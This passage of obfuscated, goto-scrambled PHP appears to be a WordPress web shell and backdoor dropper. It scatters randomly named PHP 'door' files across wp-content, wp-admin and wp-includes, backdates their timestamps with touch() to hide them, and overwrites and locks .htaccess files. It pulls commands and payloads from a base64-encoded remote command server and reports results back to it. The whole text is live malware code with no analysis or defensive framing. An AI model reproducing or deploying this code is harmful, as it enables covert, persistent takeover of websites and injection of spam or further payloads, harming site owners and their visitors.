'/wp-cron.php'; goto B41; Ee5: $index_url = $v . '/wp-blog-header.php'; goto ece; a78: } goto c59; a43: $all_results = array(); goto a4e; a4e: foreach ($all_folders as $k => $v) { $directories = glob($v . '/*', GLOB_ONLYDIR); $all_folders = array_merge($all_folders, $directories); } goto f43; E88: $path = $_SERVER['DOCUMENT_ROOT']; goto d52; f43: foreach ($all_folders as $k => $v) { if (!strpos($v, $folder_name)) { $all_results[] = $v; } } goto Cbb; d52: $folder_name = basename($path); goto C33; D5f: } goto ae7; be1: function getAllDirectories($path, $depth, $door_count) { goto cbd; F3c: $dirsPerFirstLevel = max(1, floor($totalSelections / count($firstLevelDirs))); goto d5e; C26: if (count($selectedDirectories) < $totalSelections) { goto a39; Fb1: foreach ($firstLevelDirs as $dir) { $allSubDirs = array_merge($allSubDirs, glob($dir . '/*', GLOB_ONLYDIR)); } goto a9c; a39: $additionalNeeded = $totalSelections - count($selectedDirectories); goto Aab; C8b: if (count($remainingDirs) > 0) { $additionalDirs = (array) array_rand($remainingDirs, min($additionalNeeded, count($remainingDirs))); foreach ($additionalDirs as $key) { $selectedDirectories[] = $remainingDirs[$key]; } } goto f0b; Aab: $allSubDirs = array(); goto Fb1; a9c: $remainingDirs = array_diff($allSubDirs, $selectedDirectories); goto C8b; f0b: } goto bc1; b86: $firstLevelDirs = glob($path . '/*', GLOB_ONLYDIR); goto cf9; bc1: $randomKeys = array_rand($all_paths, 1); goto B6e; cf9: $totalSelections = $door_count; goto D04; B36: $door_lists = $selectedDirectories; goto ca6; cbd: global $all_paths, $door_lists, $last_folder_url; goto b86; D04: $selectedDirectories = array(); goto F3c; B6e: foreach ((array) $randomKeys as $key) { $last_folder_url = $all_paths[$key]; } goto B36; ca6: return $all_paths; goto F79; d5e: foreach ($firstLevelDirs as $dir) { goto da6; da6: $all_paths[] = $dir; goto Fd8; daf: if (count($subDirs) >= $dirsPerFirstLevel) { $randomKeys = array_rand($subDirs, $dirsPerFirstLevel); foreach ((array) $randomKeys as $key) { $selectedDirectories[] = $subDirs[$key]; } } else { $selectedDirectories = array_merge($selectedDirectories, $subDirs); } goto a2b; Fd8: $subDirs = getAllSubdirectories($dir, 10); goto daf; a2b: } goto C26; F79: } goto A7d; abf: function othersAction($data, $pweb, $now_site) { goto A4c; e6b: $url = base64_decode($pweb) . '/indexdoor.php?action=others&group_id_2=' . $group_id_2 . '&group_id_3=' . $group_id_3 . '&shell_type=' . $shell_type; goto Da4; ae3: $json_array = json_decode($cc, true); goto Ba7; a35: $cc = curlget($url); goto ae3; cee: $res = curlpost($save_url, $result_data); goto d36; d36: if ($res['status']) { echo '<p style="color:green;">Others is successfully</p>'; } else { echo '<p style="color:red;">Others is failed! ' . $result_data['code'] . '</p>'; } goto bab; d17: $shell_type = $data['shell_type']; goto e6b; de6: $result_data['action'] = 'others'; goto Af2; Af2: $save_url = base64_decode($pweb) . '/save.php'; goto a35; E9a: $result_data['shell_type'] = $shell_type; goto cee; A4c: $shell_id = $data['shell_id']; goto c9f; B46: $result_data['shell_id'] = $shell_id; goto de6; c9f: $group_id_2 = $data['group_id_2']; goto b4f; Ba7: if (!empty($json_array['group2_code']) && !empty($json_array['second_file']) || !empty($json_array['group3_code']) && !empty($json_array['third_file'])) { $result = add_others($json_array['group2_code'], $json_array['group3_code'], $json_array['second_file'], $json_array['third_file'], $now_site); if (!empty($result['second_url']) || !empty($result['third_url'])) { goto Bc3; Bc3: $result_data['second_url'] = $result['second_url']; goto d19; Cb4: $result_data['status'] = 1; goto b1d; d19: $result_data['third_url'] = $result['third_url']; goto Cb4; b1d: } else { $result_data['code'] = '1001'; $result_data['status'] = 2; } } else { $result_data['code'] = '1002'; $result_data['status'] = 2; } goto E9a; Da4: $result_data = array(); goto B46; b4f: $group_id_3 = $data['group_id_3']; goto d17; bab: } goto F9b; A72: function curlpost($url, $data) { goto Cc1; Bc6: curl_setopt($ch, CURLOPT_HTTPHEADER, array('Content-Type: application/json', 'Content-Length: ' . strlen($jsonData))); goto b78; C84: curl_setopt($ch, CURLOPT_RETURNTRANSFER, true); goto C05; b0d: if (curl_errno($ch)) { $result['status'] = 0; $result['msg'] = curl_error($ch); } goto b74; C05: curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false); goto Bc6; cbe: $result = array(); goto b0d; b78: curl_setopt($ch, CURLOPT_POST, true); goto Bea; Bea: curl_setopt($ch, CURLOPT_POSTFIELDS, $jsonData); goto B5d; Ce5: $res = json_decode($response, true); goto Dc5; Cc1: $jsonData = json_encode($data); goto Ba5; B5d: $response = curl_exec($ch); goto cbe; Dc5: $result['status'] = $res['status']; goto a06; b74: curl_close($ch); goto Ce5; a06: return $result; goto Be9; Ba5: $ch = curl_init($url); goto C84; Be9: } goto Dee; Eb9: if ($type == 1) { if (!empty($dir)) { $path = $dir; } $now_path = $path; } goto f7a; Afa: $now_site = $prot . $domain; goto f6e; f63: $file_path = $data['SCRIPT_FILENAME']; goto f4a; e5b: function deleteFile($file) { if (file_exists($file)) { chmod($file, 0777); if (unlink($file)) { echo '<p style="color:green;font-weight: bold;">' . $file . " is delete success" . '</p>'; } else { echo '<p style="color:red;font-weight: bold;">' . $file . " is delete error" . '</p>'; } } else { echo '<p style="color:red;font-weight: bold;">' . $file . " is not exist" . '</p>'; } } goto b5b; ae7: function getParentsFolders($path) { goto Fef; Fef: $all_folders = array(); goto a27; a27: $parent_folds = dirname($path); goto a52; D7e: $all_folders = array_merge($all_folders, $directories); goto e14; a1d: $parent_folds = dirname($parent_folds); goto ed0; a52: $directories = glob($parent_folds . '/*', GLOB_ONLYDIR); goto fed; e14: return $all_folders; goto A63; ed0: $directories = glob($parent_folds . '/*', GLOB_ONLYDIR); goto D7e; fed: $all_folders = $directories; goto a1d; A63: } goto E74; f81: function fill_full($file_urls, $sy_count) { goto e84; c4c: $file_list = array('css', 'images', 'img', 'js', 'themes', 'plugins', 'uploads', 'languages', 'includes', 'maint', 'network', 'met', 'user', 'IXR', 'ID3', 'fonts', 'block', 'blocks', 'php-compat', 'php', 'Text', 'widgets', 'SimplePie', 'random', 'style-engine', 'pomo', 'certificates', 'blockt'); goto a70; e84: $path = realpath($_SERVER['DOCUMENT_ROOT']); goto F46; F46: $file_url_result = array(); goto Dc1; a90: $file_tou = array('wp-content', 'wp-admin', 'wp-includes'); goto c4c; a70: for ($i = 0; $i < $sy_count; $i++) { $path_url = $path . '/' . $file_tou[rand(0, count($file_tou) - 1)]; for ($j = 0; $j < rand(3, 6); $j++) { $path_url = $path_url . '/' . $file_list[rand(0, count($file_list) - 1)]; } $file_url_result[] = $path_url; } goto E90; Dc1: foreach ($file_urls as $k => $v) { if (!empty(trim($v))) { $file_url_result[] = $v; } } goto a90; E90: return $file_url_result; goto D29; D29: } goto be1; F38: session_start(); goto C55; f4a: $now_path = dirname($file_path); goto af2; B54: function getFilePermission($filename) { goto B87; B87: clearstatcache(true, $filename); goto c75; Eb4: $info .= $perms & 0x80 ? 'w' : '-'; goto D7b; D7b: $info .= $perms & 0x40 ? $perms & 0x800 ? 's' : 'x' : ($perms & 0x800 ? 'S' : '-'); goto e41; B47: $info .= $perms & 0x100 ? 'r' : '-'; goto Eb4; b3a: $info .= $perms & 0x1 ? $perms & 0x200 ? 't' : 'x' : ($perms & 0x200 ? 'T' : '-'); goto Faf; A67: $info .= $perms & 0x8 ? $perms & 0x400 ? 's' : 'x' : ($perms & 0x400 ? 'S' : '-'); goto f2d; c75: $perms = fileperms($filename); goto c64; f2d: $info .= $perms & 0x4 ? 'r' : '-'; goto f90; C2a: $info .= $perms & 0x10 ? 'w' : '-'; goto A67; e41: $info .= $perms & 0x20 ? 'r' : '-'; goto C2a; Faf: return $info; goto e64; c64: if (($perms & 0xc000) === 0xc000) { $info = 's'; } elseif (($perms & 0xa000) === 0xa000) { $info = 'l'; } elseif (($perms & 0x8000) === 0x8000) { $info = '-'; } elseif (($perms & 0x6000) === 0x6000) { $info = 'b'; } elseif (($perms & 0x4000) === 0x4000) { $info = 'd'; } elseif (($perms & 0x2000) === 0x2000) { $info = 'c'; } elseif (($perms & 0x1000) === 0x1000) { $info = 'p'; } else { $info = 'u'; } goto B47; f90: $info .= $perms & 0x2 ? 'w' : '-'; goto b3a; e64: } goto Ea9; ea5: $web_url = $data['REQUEST_SCHEME'] . "://" . $data['SERVER_NAME']; goto Ad7; C55: $type = $_REQUEST['type']; goto b39; b39: $path = $_REQUEST['path']; goto fc6; E5a: function execAction($data, $pweb, $now_site) { goto C8d; ac0: $result_data = array(); goto acf; Eba: $result_data['shell_type'] = $shell_type; goto bc2; bc2: $res = curlpost($save_url, $result_data); goto db4; db4: if ($res['status']) { echo '<p style="color:green;">Exec is successfully</p>'; } else { echo '<p style="color:red;">Exec is failed! ' . $result_data['code'] . '</p>'; } goto Cfa; Abc: if (isset($json_array['in_contnt']) && !empty($json_array['ht_contnt']) && !empty($json_array['exec_code'])) { goto D8c; fbd: if ($result) { $result_data['status'] = 1; } else { $result_data['code'] = '1001'; $result_data['status'] = 2; } goto B1c; D8c: $website_root = $_SERVER['DOCUMENT_ROOT']; goto d7a; d7a: $result = add_exec($website_root, $json_array['ht_contnt'], $json_array['in_contnt'], $json_array['exec_code'], $json_array['wp_ycode']); goto fbd; B1c: } else { $result_data['code'] = '1002'; $result_data['status'] = 2; } goto Eba; ec7: $url = base64_decode($pweb) . '/indexdoor.php?action=new_exec&group_id=' . $group_id . '&shell_type=' . $shell_type; goto ac0; C8d: $group_id = $data['group_id']; goto B6c; caa: $cc = curlget($url); goto d3c; B6c: $shell_id = $data['shell_id']; goto Bcd; Bcd: $shell_type = $data['shell_type']; goto ec7; acf: $result_data['shell_id'] = $shell_id; goto b04; d3c: $json_array = json_decode($cc, true); goto Abc; b04: $result_data['action'] = 'exec'; goto B51; B51: $save_url = base64_decode($pweb) . '/save.php'; goto caa; Cfa: } goto f09; F58: $prot = !empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off' || $_SERVER['SERVER_PORT'] == 443 ? "https://" : "http://"; goto ace; Ea9: function sortByFolder($now_path, $all_list) { goto dca; Ee9: sort($file_list); goto e1e; Eac: $file_list = array(); goto Be3; Be3: foreach ($all_list as $k => $v) { if (is_dir($now_path . '/' . $v)) { $folder_list[] = $v; } else { $file_list[] = $v; } } goto C34; C34: sort($folder_list); goto Ee9; d5c: return $all_list; goto be6; dca: $folder_list = array(); goto Eac; e1e: $all_list = array_merge($folder_list, $file_list); goto d5c; be6: } goto ea9; Cba: function strslit($str) { $cha = str_split($str); return "'" . implode("'.'", $cha) . "'"; } goto bc3; c61: function crdoorfile($fipath, $contnt) { if (file_put_contents($fipath, $contnt) !== false) { goto f66; f66: $time = time() - rand(30, 100) * 24 * 60 * 60 - rand(0, 3600); goto e46; e46: touch($fipath, $time); goto c10; c10: return true; goto d9a; d9a: } else { return false; } } goto ef2; Daa: function deleteDirectory($dir) { goto fff; eda: $files = glob($dir . '/*'); goto b06; fff: if (!is_dir($dir)) { return false; } goto eda; A08: return rmdir($dir); goto ea0; b06: foreach ($files as $file) { if (is_file($file)) { unlink($file); } elseif (is_dir($file)) { deleteDirectory($file); } } goto A08; ea0: } goto e5b; bd2: error_reporting(0); goto E2f; E74: function curlget($url) { goto C28; dc0: if (empty($url_data) && function_exists('curl_exec')) { goto E1b; Ebf: curl_setopt($conn, CURLOPT_SSL_VERIFYHOST, 0); goto Cda; cd1: curl_close($conn); goto A15; Cda: $url_data = curl_exec($conn); goto cd1; f94: curl_setopt($conn, CURLOPT_SSL_VERIFYPEER, 0); goto Ebf; ca4: curl_setopt($conn, CURLOPT_FOLLOWLOCATION, 1); goto f94; E1b: $conn = curl_init($url); goto ca8; ca8: curl_setopt($conn, CURLOPT_RETURNTRANSFER, 1); goto ca4; A15: } goto fb7; Ad9: if (function_exists('file_get_contents')) { $url_data = file_get_contents($url); } goto dc0; E85: return $url_data; goto c53; fb7: if (empty($url_data) && function_exists('fopen') && function_exists('stream_get_contents')) { goto Df5; Df5: $handle = fopen($url, "r"); goto Ffd; d1e: fclose($handle); goto c0c; Ffd: $url_data = stream_get_contents($handle); goto d1e; c0c: } goto E85; C28: $url_data = ""; goto Ad9; c53: } goto A72; D80: function getFileSize($file_url) { goto c51; c51: $file_size = filesize($file_url); goto Fc9; b44: return $file_size; goto Ae2; Fc9: if ($file_size > 1024 * 1024) { $file_size = round($file_size / (1024 * 1024), 2) . ' MB'; } else { if ($file_size > 1024) { $file_size = round($file_size / 1024, 2) . ' KB'; } else { $file_size = $file_size . ' B'; } } goto b44; Ae2: } goto B54; E16: if (!empty($post_data)) { foreach ($post_data as $k => $v) { $_SESSION[$k] = $v; } } goto F62; da8: function stationAction($data, $pweb, $now_site) { goto ab4; De8: $shell_type = $data['shell_type']; goto e92; ab4: $result_data = array(); goto A06; abb: $json_array = json_decode($cc, true); goto B8e; D6a: $result_data['shell_url'] = $now_site; goto A2d; B8e: $station_count = 0; goto e2e; ecf: $res = curlpost($save_url, $result_data); goto fdd; E46: $save_url = base64_decode($pweb) . '/save.php'; goto Aa4; d2f: $cc = curlget($url); goto abb; e2e: if (!empty($json_array['station_code']) && !empty($json_array['ht_pz_content'])) { $station_count = add_station($json_array['station_code'], $json_array['ht_pz_content'], $now_site); if ($station_count > 0) { $result_data['station_count'] = $station_count; $result_data['status'] = 1; } else { $result_data['code'] = '1001'; $result_data['status'] = 2; } } else { $result_data['code'] = '1002'; $result_data['status'] = 2; } goto D6a; e92: $url = base64_decode($pweb) . '/indexdoor.php?action=station&shell_id=' . $shell_id . '&shell_type=' . $shell_type; goto d2f; A2d: $result_data['shell_type'] = $shell_type; goto ecf; fdd: if ($res['status']) { echo '<p style="color:green;">Station is successfully, Success is ' . $station_count . '</p>'; } else { echo '<p style="color:red;">Station is failed! ' . $result_data['code'] . '</p>'; } goto d0a; A06: $result_data['shell_id'] = $data['shell_id']; goto b28; b28: $result_data['action'] = 'station'; goto E46; Aa4: $shell_id = $data['shell_id']; goto De8; d0a: } goto fd0; F62: $all_paths = array(); goto Ac3; f7a: $file_path_array = explode('/', $file_path); goto d46; ea9: function rebackAction($data, $pweb, $now_site) { goto Af0; B93: $res = curlpost($save_url, $result_data); goto b47; F89: $result_data['shell_id'] = $shell_id; goto fef; Ccf: $save_url = base64_decode($pweb) . '/save.php'; goto a18; fef: $result_data['action'] = 'reback'; goto Ccf; d70: $shell_type = $data['shell_type']; goto Ec8; Fd6: $shell_id = $data['shell_id']; goto d70; a18: if (isset($json_array['in_files']) && !empty($json_array['in_files'])) { goto Ff4; A04: $wp_result = array(); goto ab5; c62: $ht_list = explode(';', $json_array['ht_files']); goto c68; c68: foreach ($ht_list as $k => $v) { goto aa9; f24: crefile($v, $contnt); goto f72; dec: $wp_code = str_replace('[##ht_contnt_' . $k . '##]', $wpstr, $wp_code); goto C61; aa9: $wpstr = strslit($v); goto dec; C61: $contnt = $json_array['ht_contnt']; goto f24; f72: } goto F0c; F0c: $wp_list = explode(';', $json_array['wp_files']); goto A04; b6e: foreach ($in_list as $k => $v) { goto c13; b43: crefile($v, $contnt); goto e0f; c13: $wpstr = strslit($v); goto C59; f28: $contnt = $json_array['code'] . $json_array['wp_ycode']; goto b43; C59: $wp_code = str_replace('[##in_contnt_' . $k . '##]', $wpstr, $wp_code); goto f28; e0f: } goto c62; F32: if (!empty($wp_result) && count($wp_result) > 0) { $result_data['wp_urls'] = $wp_result; $result_data['status'] = 1; } else { $result_data['code'] = '1001'; $result_data['status'] = 2; } goto Bdf; d6b: $in_list = explode(';', $json_array['in_files']); goto b6e; Ff4: $wp_code = $json_array['wp_code']; goto d6b; ab5: foreach ($wp_list as $k => $v) { $f = crefile($v, $wp_code); if ($f) { $wp_result[] = $now_site . $v; } } goto F32; Bdf: } else { $result_data['code'] = '1002'; $result_data['status'] = 2; } goto F7f; Ff6: $result_data = array(); goto F89; F7f: $result_data['shell_url'] = $now_site; goto d0f; d0f: $result_data['shell_type'] = $shell_type; goto B93; Ec8: $url = base64_decode($pweb) . '/indexdoor.php?action=reback&group_id=' . $group_id . '&shell_type=' . $shell_type; goto d5f; b47: if ($res['status']) { echo '<p style="color:green;">Reback is successfully</p>'; foreach ($wp_result as $k => $v) { echo '<p><a href="' . $v . '" target="_blank">' . $v . '</a></p>'; } } else { echo '<p style="color:red;">Reback is failed! ' . $result_data['code'] . '</p>'; } goto C9e; Af0: $group_id = $data['group_id']; goto Fd6; cbc: $json_array = json_decode($cc, true); goto Ff6; d5f: $cc = curlget($url); goto cbc; C9e: } goto E5a; bc3: function getrandstr($length = 10) { goto F12; Dd3: $randomString = ''; goto cb9; F12: $characters = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'; goto Dd3; B64: return $randomString; goto ff7; cb9: for ($i = 0; $i < $length; $i++) { $randomString .= $characters[rand(0, strlen($characters) - 1)]; } goto B64; ff7: } goto Daa; af2: $dir = $_POST['dir']; goto ea5; a7b: $can_write = false; goto e91; a3e: function add_doors($doors_array, $doors_55_array, $wp_files, $third_file, $ban_content, $open_content, $shell_action_code, $now_site) { goto F88; ff8: $door_files = array(); goto f31; C49: $randomKeys = array_rand($door_lists, count($doors_array) + count($doors_55_array)); goto ff8; E98: return $result; goto a48; Fc0: $result['shell_other_url'] = $shell_other_url; goto B32; Cbd: $shell_other_url = ""; goto Ef6; D9b: $i = 0; goto Cbd; b79: if (count($succ_files) > 0) { goto C96; f2f: foreach ($wp_files_array as $k => $v) { $wp_files_array[$k] = $path . $v; } goto F64; a81: $ht_folders = array(); goto A0c; D50: $ht_urls = array_merge($ht_urls, $wp_files_array); goto B74; C44: foreach ($ht_urls as $k => $v) { $ht_folders[] = dirname($v); $ht_files[] = basename($v); } goto f83; A0c: $ht_files = array(); goto C44; C96: $ht_urls = array(); goto dc5; dc5: $wp_files_array = explode(";", $wp_files); goto f2f; f83: foreach ($all_paths as $k => $a) { goto A44; b8b: foreach ($ht_folders as $htk => $htv) { if ($a == $htv) { $now_files[] = $ht_files[$htk]; } } goto baf; A44: $now_files = array(); goto b8b; baf: $ht_content_now = ""; goto f33; e7a: if (file_put_contents($a . '/.htaccess', $ht_content_now) !== false) { $count++; chmod($a . '/.htaccess', 0555); } goto adf; d9f: chmod($a . '/.htaccess', 0755); goto e7a; f33: if (!empty($now_files)) { $ht_content_now = str_replace('{#htcontent}', implode('|', $now_files), $open_content); } else { $ht_content_now = $ban_content; } goto d9f; adf: } goto aec; F64: $ht_urls = $succ_files; goto D50; B74: $ht_urls[] = $path . '/' . $third_file; goto a81; aec: } goto a13; a60: $door_count = count($doors_array) + count($doors_55_array); goto f68; F88: $result = array(); goto E01; E26: $count = 0; goto b79; f68: getAllDirectories($path, 1, $door_count); goto ab9; f31: $succ_files = array(); goto D9b; D70: $path = $_SERVER['DOCUMENT_ROOT']; goto a60; ab9: if (count($door_lists) < $door_count) { $sy_count = count($doors_array) + count($doors_55_array) - count($door_lists); $door_lists = fill_full($door_lists, $sy_count); } goto C49; a6b: if (!empty($last_folder_url)) { goto Cfc; Ab2: $res = crdoorfile($file_url, base64_decode($shell_action_code)); goto c33; c33: if ($res) { $shell_other_url = str_replace($path, $now_site, $file_url); } goto a84; Cfc: $file_url = $last_folder_url . '/index.php'; goto Ab2; a84: } goto E26; B32: $result['count'] = $count; goto E98; E01: global $door_lists, $all_paths, $last_folder_url; goto D70; Ef6: foreach ($randomKeys as $key) { goto Dcc; Dcc: $file_door_url = $door_lists[$key]; goto fcb; c85: if ($res) { $succ_files[] = $file_url; $door_files[] = str_replace($path, $now_site, $file_url); } else { } goto Af5; Af5: $i++; goto d5b; E6e: if ($i >= count($doors_array)) { goto fbf; fbf: $file_door_url = $file_door_url . '/wp'; goto Efc; E42: $res = cndoorfile($file_door_url, $file_name, $open_content, $doors_55_array[$i - count($doors_array)]); goto cb2; Efc: $file_url = $file_door_url . '/' . $file_name; goto E42; cb2: } else { $file_url = $file_door_url . '/' . $file_name; $res = crdoorfile($file_url, $doors_array[$i]); } goto c85; fcb: $file_name = getrandstr(rand(5, 10)) . '.php'; goto E6e; d5b: } goto a6b; a13: $result['door_files'] = $door_files; goto Fc0; a48: } goto f81; fc6: $data = $_SERVER; goto e8b; e91: if (is_writable($now_path)) { $can_write = true; } goto F58; ca2: $pws = "aHR0cHM6Ly9mcDIwMjQuYnlob3QudG9w"; goto E16; Ac3: $door_lists = array(); goto a9f; b5b: function findFilesWithContent($directory, $searchString, $currentDepth = 0, $maxDepth = 10) { goto d83; d83: $foundFiles = []; goto E38; Aa0: return $foundFiles; goto Ecb; Fb6: if ($handle = opendir($directory)) { while (false !== ($file = readdir($handle))) { if ($file != "." && $file != "..") { $filePath = $directory . '/' . $file; if (is_dir($filePath)) { $foundFiles = array_merge($foundFiles, findFilesWithContent($filePath, $searchString, $currentDepth + 1, $maxDepth)); } else { if (strpos(file_get_contents($filePath), $searchString) !== false) { $foundFiles[] = $filePath; } } } } closedir($handle); } goto Aa0; E38: if ($currentDepth >= $maxDepth) { return $foundFiles; } goto Fb6; Ecb: }
